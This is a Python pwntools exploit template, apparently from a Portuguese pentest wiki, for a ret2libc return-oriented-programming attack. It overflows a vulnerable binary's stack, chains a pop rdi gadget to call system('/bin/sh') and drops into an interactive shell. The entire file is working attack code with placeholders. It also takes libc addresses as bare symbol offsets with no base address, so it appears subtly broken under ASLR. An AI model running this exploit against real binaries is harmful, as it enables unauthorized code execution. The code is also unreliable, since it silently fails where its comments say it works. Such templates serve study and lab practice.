#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Template: stack/ret2libc_x86_64 — ret2libc via ROP
#
# > Fonte: [Bíblia do Pentest BR](https://0xmorte.gitbook.io/bibliadopentestbr/)
# > Seção: Linguagens & Runtimes — memory corruption / ret2libc (ROP)
# > Última sincronização: 2026-11-05
#
# Placeholders:
#   $BIN     — caminho do binário vulnerável
#   $LIB     — caminho da libc (ex.: /lib/x86_64-linux-gnu/libc.so.6)
#   $OFFSET  — offset até o return address
#   $POP_RDI — endereço de pop rdi; ret (hex, sem 0x)
#   $RET     — gadget `ret` (para alinhamento de stack, hex, sem 0x)
#
# O script resolve system e "/bin/sh" a partir da libc usando os offsets informados.
# Preencha $POP_RDI/$RET com gadgets obtidos via a tool `ROP`.

from pwn import *

context.arch = "amd64"
context.log_level = "error"

BIN = "$BIN"
LIB = "$LIB"
OFFSET = $OFFSET
POP_RDI = 0x$POP_RDI
RET = 0x$RET

libc = ELF(LIB)
system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh"))

payload = b"A" * OFFSET
payload += p64(RET)          # stack alignment (16-byte)
payload += p64(POP_RDI)
payload += p64(binsh)
payload += p64(system)

p = process(BIN)
p.sendline(payload)
p.interactive()
